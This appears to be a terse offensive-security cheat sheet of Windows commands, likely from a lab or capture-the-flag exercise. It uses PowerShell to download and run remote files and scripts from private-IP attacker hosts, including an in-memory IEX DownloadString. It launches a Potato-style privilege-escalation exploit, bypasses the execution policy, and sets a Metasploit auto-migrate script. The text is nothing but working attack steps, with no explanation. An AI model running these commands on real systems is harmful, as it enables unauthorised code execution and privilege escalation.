```
mkdir c:\Users\Public\x

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.166/whoami.exe', 'c:\Users\Public\x\whoami.exe')

C:\Users\Public\x\potato.exe -t t -p C:\Users\Public\x\whoami.exe -l 5837

IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.160:8080/Invoke-LovelyPotato.ps1')


powershell.exe -ep bypass -File c:\users\public\x\Invoke-LovelyPotato.ps1
```

```
set AutoRunScript post/windows/manage/migrate
```